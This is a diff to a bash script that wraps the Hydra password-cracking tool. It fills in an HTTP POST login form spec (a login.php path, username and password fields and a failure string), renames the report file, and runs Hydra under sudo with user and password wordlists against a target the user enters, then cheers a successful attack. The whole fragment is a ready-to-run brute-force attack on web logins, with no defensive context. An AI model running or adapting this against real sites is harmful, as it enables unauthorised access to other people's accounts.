@@ -16,9 +16,9 @@ read -p "Enter thread [4-16]: " thread;
 
 # Report path
 user=$(whoami);
-reportPath="/home/${user}/Desktop/Hydra-${target}.txt";
+reportPath="/home/${user}/Desktop/hydra.txt";
 
-hydraAttack=$(echo ${sudo_passwd} | sudo hydra -L ${nameList} -P ${wordList} ${target} http-post-form "" -t ${thread} -vV -o ${reportPath});
+hydraAttack=$(echo ${sudo_passwd} | sudo hydra -L ${nameList} -P ${wordList} ${target} http-post-form "/login.php:username=^USER^&password=^PASS^:login failed" -t ${thread} -vV -o ${reportPath});
 if [[ ${?} -eq 0 ]];
 then
     echo "Succeeded hydraAttack :D!";
